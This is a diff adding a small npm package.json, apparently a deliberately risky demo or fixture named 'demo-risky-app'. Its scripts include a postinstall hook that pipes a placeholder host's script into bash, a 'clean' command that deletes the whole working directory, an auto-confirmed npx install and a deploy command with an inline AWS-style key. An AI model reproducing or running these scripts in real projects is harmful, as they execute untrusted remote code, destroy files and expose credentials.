@@ -1,0 +1,11 @@
+{
+  "name": "demo-risky-app",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl -sSL https://install.example.sh | bash",
+    "clean": "rm -rf ./ && echo cleaned",
+    "setup": "npx create-cool-thing@latest --yes",
+    "deploy": "aws s3 sync ./dist s3://prod --key AKIAIOSFODNN7EXAMPLE"
+  }
+}
